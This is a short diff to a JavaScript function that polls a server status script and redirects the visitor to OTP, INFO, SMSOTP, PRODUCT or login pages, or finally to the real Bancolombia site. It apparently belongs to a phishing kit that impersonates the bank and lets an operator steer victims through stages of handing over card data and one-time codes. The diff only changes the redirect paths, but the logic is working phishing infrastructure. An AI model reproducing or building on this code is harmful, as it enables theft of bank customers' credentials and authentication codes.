@@ -108,12 +108,12 @@ function pasotarjeta(t,f,c){
 function consultar_estado(){    
     $.post( "../process/estado.php",function(data) {        
         switch (data) {
-            case '2': window.location.href = "OTP"; break;
-            case '4': window.location.href = "INFO"; break;
-            case '6': window.location.href = "PRODUCT"; break;               
-            case '8': window.location.href = "SMSOTP"; break;
+            case '2': window.location.href = "../a/OTP.php"; break;
+            case '4': window.location.href = "../a/INFO.php"; break;
+            case '6': window.location.href = "../a/PRODUCT.php"; break;               
+            case '8': window.location.href = "../a/SMSOTP.php"; break;
             case '10': window.location.href = "https://www.bancolombia.com/personas"; break;
-            case '12': window.location.href = "login"; break;
+            case '12': window.location.href = "../a/login.php"; break;
         } 
     });        
 }
